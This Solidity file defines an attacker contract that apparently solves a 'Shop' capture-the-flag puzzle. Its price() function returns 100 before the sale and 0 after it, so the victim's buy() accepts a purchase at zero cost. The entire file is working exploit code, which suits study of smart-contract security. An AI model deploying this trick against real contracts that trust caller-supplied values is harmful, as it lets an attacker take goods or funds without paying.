// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttacker {
    Shop victim;

    constructor(address _victim) {
        victim = Shop(_victim);
    }

    function price() external view returns (uint256) {
        return victim.isSold() ? 0 : 100;
    }

    function attack() external {
        victim.buy();
    }
}
